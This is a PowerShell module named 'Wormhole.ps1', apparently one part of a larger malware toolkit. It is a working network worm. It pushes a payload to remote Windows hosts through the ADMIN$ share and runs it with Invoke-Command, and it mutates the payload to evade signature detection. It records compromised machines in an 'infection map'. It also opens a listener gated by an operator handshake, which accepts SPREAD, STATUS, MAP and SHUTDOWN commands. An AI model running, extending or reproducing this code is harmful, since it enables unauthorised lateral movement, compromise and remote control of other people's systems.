# Modules/Wormhole.ps1
# Wormhole Protocol - Stealth propagation with operator handshake gating
# Memory-only propagation, no persistent writes

$script:InfectionMap = @{}
$script:OperatorKey = 'RvL_0517'
$script:WormholeActive = $false

function Get-OperatorSignature {
    param([string]$Data)
    $kb = [Text.Encoding]::UTF8.GetBytes($script:OperatorKey)
    $db = [Text.Encoding]::UTF8.GetBytes($Data)
    $h = New-Object System.Security.Cryptography.HMACSHA256
    $h.Key = $kb
    return ([BitConverter]::ToString($h.ComputeHash($db))) -replace '-', ''
}

function Test-OperatorHandshake {
    param(
        [string]$Challenge,
        [string]$Response
    )
    $expected = Get-OperatorSignature -Data $Challenge
    return ($expected -eq $Response)
}

function Test-AlreadyInfected {
    param([string]$HostId)
    return $script:InfectionMap.ContainsKey($HostId)
}

function Register-Infection {
    param([string]$HostId)
    $script:InfectionMap[$HostId] = @{
        Timestamp = (Get-Date).ToUniversalTime()
        Status = "Active"
    }
    Write-GhostLog "Registered infection for host: $HostId"
}

function Get-HostIdentifier {
    $mac = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).MacAddress
    $hostname = $env:COMPUTERNAME
    return Get-OperatorSignature -Data "$hostname|$mac"
}

function Invoke-WormholeSpread {
    param(
        [string]$TargetHost,
        [string]$PayloadPath,
        [switch]$ForceSMB
    )
    
    $targetId = "$TargetHost|spread"
    
    if (Test-AlreadyInfected -HostId $targetId) {
        Write-GhostLog "Skipping $TargetHost - already infected"
        return $false
    }
    
    $challenge = [guid]::NewGuid().ToString()
    $timestamp = (Get-Date).ToUniversalTime().ToString("o")
    
    if (-not (Test-BLEOperatorPresent) -and -not $ForceSMB) {
        Write-GhostLog "No BLE operator detected - hard-fail exit"
        return $false
    }
    
    try {
        if ($ForceSMB -or (Test-Path "\\$TargetHost\ADMIN$")) {
            $remotePath = "\\$TargetHost\ADMIN$\Temp\ghost_payload.ps1"
            
            if (Test-Path $PayloadPath) {
                $payloadContent = Get-Content $PayloadPath -Raw
                $mutatedPayload = Invoke-PayloadMutation -Content $payloadContent
                
                Set-Content -Path $remotePath -Value $mutatedPayload -Force
                
                $result = Invoke-Command -ComputerName $TargetHost -ScriptBlock {
                    param($path)
                    if (Test-Path $path) {
                        & $path
                        Remove-Item $path -Force
                        return $true
                    }
                    return $false
                } -ArgumentList "C:\Windows\Temp\ghost_payload.ps1" -ErrorAction SilentlyContinue
                
                if ($result) {
                    Register-Infection -HostId $targetId
                    return $true
                }
            }
        }
    }
    catch {
        Write-GhostLog "Spread to $TargetHost failed: $_"
    }
    
    return $false
}

function Invoke-PayloadMutation {
    param([string]$Content)
    
    $mutations = @(
        { param($c) $c -replace 'function\s+', "function Ghost$([guid]::NewGuid().ToString().Substring(0,8))_" },
        { param($c) $c -replace '\$(\w+)', "`$g$([char](Get-Random -Minimum 97 -Maximum 123))`$1" },
        { param($c) "# $(Get-Random)`n$c" }
    )
    
    $mutation = $mutations | Get-Random
    return (& $mutation $Content)
}

function Test-BLEOperatorPresent {
    try {
        $bleDevices = Get-PnpDevice -Class Bluetooth -Status OK -ErrorAction SilentlyContinue
        foreach ($device in $bleDevices) {
            if ($device.FriendlyName -match "Ghost|Flipper|Operator") {
                return $true
            }
        }
    }
    catch {}
    
    if (Test-Path "$env:ProgramData\.ghost_ble_active") {
        return $true
    }
    
    return $false
}

function Start-WormholeListener {
    param(
        [int]$Port = 8787,
        [int]$Timeout = 300
    )
    
    if ($script:WormholeActive) {
        Write-GhostLog "Wormhole already active"
        return
    }
    
    $script:WormholeActive = $true
    Write-GhostLog "Wormhole listener starting on port $Port"
    
    $hostId = Get-HostIdentifier
    if (Test-AlreadyInfected -HostId $hostId) {
        Write-GhostLog "This host already registered - skipping reinfection"
    }
    else {
        Register-Infection -HostId $hostId
    }
    
    try {
        $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
        $listener.Start()
        
        $startTime = Get-Date
        
        while ($script:WormholeActive) {
            if (((Get-Date) - $startTime).TotalSeconds -gt $Timeout) {
                Write-GhostLog "Wormhole timeout reached"
                break
            }
            
            if ($listener.Pending()) {
                $client = $listener.AcceptTcpClient()
                $stream = $client.GetStream()
                $reader = New-Object System.IO.StreamReader($stream)
                $writer = New-Object System.IO.StreamWriter($stream)
                
                try {
                    $challenge = [guid]::NewGuid().ToString()
                    $writer.WriteLine("CHALLENGE:$challenge")
                    $writer.Flush()
                    
                    $response = $reader.ReadLine()
                    
                    if (Test-OperatorHandshake -Challenge $challenge -Response $response) {
                        $writer.WriteLine("ACK")
                        $writer.Flush()
                        
                        $command = $reader.ReadLine()
                        Process-WormholeCommand -Command $command -Writer $writer
                    }
                    else {
                        $writer.WriteLine("REJECT")
                        Write-GhostLog "Rejected unauthorized connection"
                    }
                }
                finally {
                    $client.Close()
                }
            }
            
            Start-Sleep -Milliseconds 100
        }
    }
    catch {
        Write-GhostLog "Wormhole error: $_"
    }
    finally {
        if ($listener) { $listener.Stop() }
        $script:WormholeActive = $false
        Write-GhostLog "Wormhole listener stopped"
    }
}

function Stop-WormholeListener {
    $script:WormholeActive = $false
    Write-GhostLog "Wormhole shutdown requested"
}

function Process-WormholeCommand {
    param(
        [string]$Command,
        [System.IO.StreamWriter]$Writer
    )
    
    $parts = $Command -split ':'
    $action = $parts[0].ToUpper()
    
    switch ($action) {
        "SPREAD" {
            $target = $parts[1]
            $result = Invoke-WormholeSpread -TargetHost $target -PayloadPath "$PSScriptRoot\..\GhostResidency.ps1"
            $Writer.WriteLine("SPREAD:$target:$result")
        }
        "STATUS" {
            $count = $script:InfectionMap.Count
            $Writer.WriteLine("STATUS:HOSTS:$count")
        }
        "MAP" {
            $map = $script:InfectionMap.Keys -join ','
            $Writer.WriteLine("MAP:$map")
        }
        "SHUTDOWN" {
            $Writer.WriteLine("SHUTDOWN:ACK")
            Stop-WormholeListener
        }
        default {
            $Writer.WriteLine("UNKNOWN:$Command")
        }
    }
    $Writer.Flush()
}

function Get-InfectionMap {
    return $script:InfectionMap.Clone()
}

function Clear-InfectionMap {
    $script:InfectionMap.Clear()
    Write-GhostLog "Infection map cleared"
}

function Write-GhostLog {
    param([string]$Message)
    $logFile = "$env:ProgramData\ghost_ops_log.txt"
    $timestamp = Get-Date -Format o
    try {
        Add-Content -Path $logFile -Value "[$timestamp][Wormhole] $Message" -ErrorAction SilentlyContinue
    }
    catch {}
}

Export-ModuleMember -Function Start-WormholeListener, Stop-WormholeListener, Invoke-WormholeSpread, Get-InfectionMap, Clear-InfectionMap, Test-BLEOperatorPresent
